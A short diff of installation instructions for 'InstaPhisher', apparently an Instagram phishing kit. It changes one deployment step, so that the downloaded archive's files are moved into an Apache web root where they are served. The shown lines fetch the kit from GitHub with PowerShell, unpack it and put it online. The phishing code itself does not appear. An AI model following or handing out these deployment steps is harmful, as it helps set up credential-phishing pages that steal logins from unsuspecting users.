@@ -115,7 +115,7 @@ AddHandler application/x-httpd-php .php
 ```
 Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/archive/master.zip" -OutFile "%userprofile%\Downloads\InstaPhisher.zip"
 Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\InstaPhisher.zip" -DestinationPath "%userprofile%\Downloads\InstaPhisher"
-move /Y %userprofile%\Downloads\InstaPhisher C:\Apache24\htdocs
+Powershell.exe Move-Item -Path "%userprofile%\Downloads\InstaPhisher\InstaPhisher-master\*" -Destination "C:\Apache24\htdocs\"
 ```
 
 # Notice
